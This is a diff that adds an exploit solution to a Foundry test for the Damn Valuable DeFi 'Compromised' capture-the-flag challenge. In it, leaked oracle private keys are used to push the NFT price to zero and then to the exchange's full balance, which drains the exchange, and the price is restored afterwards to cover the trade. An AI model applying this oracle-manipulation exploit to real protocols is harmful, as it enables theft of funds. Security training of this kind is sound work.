@@ -18,6 +18,10 @@ contract Compromised is Test {
     DamnValuableNFT internal damnValuableNFT;
     address payable internal attacker;
 
+    //Declare oracles add
+    address oracle1;
+    address oracle2;
+
     function setUp() public {
         address[] memory sources = new address[](3);
 
@@ -76,7 +80,55 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
 
+        /*-------Setting the price low----------*/
+        vm.startBroadcast (oracle1);
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.stopBroadcast();
+        /*------- Buy a low price---------------*/
+        vm.startBroadcast(attacker);
+        uint256 tokenId1 = exchange.buyOne{value: 1}();
+     
+        vm.stopBroadcast();
+
+        /*-------Setting the price high----------*/
+
+        vm.startBroadcast (oracle1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(oracle2);
+        trustfulOracle.postPrice("DVNFT",  EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopBroadcast();
+
+        /*-------Sell at a high price------------*/
+        vm.startBroadcast(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId1);
+ 
+
+
+        exchange.sellOne(tokenId1); // sold at : 9990.000000000000000000
+        vm.stopBroadcast();
+
+        vm.startBroadcast (oracle1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(oracle2);
+        trustfulOracle.postPrice("DVNFT",  INITIAL_NFT_PRICE);
+        vm.stopBroadcast();
+
+
+        console.log ("This one has to be 0 ETH ",address(exchange).balance);
+        console.log ("This one has to be huge ",attacker.balance);
+        console.log ("This one has to be 0 ",damnValuableNFT.balanceOf(attacker));
+        console.log("This one has to be the same at initial price which means 990 ETH per NFT ",trustfulOracle.getMedianPrice("DVNFT"));
         /**
          * EXPLOIT END *
          */
@@ -98,3 +150,18 @@ contract Compromised is Test {
         assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
+
+
+/* 
+First Private key  :0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+Second Private key :0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+
+1. use the private keys to set the price down 
+2. buy all NFTs
+3. set the initial price 
+4. sell all NTFs  
+
+
+
+
+*/
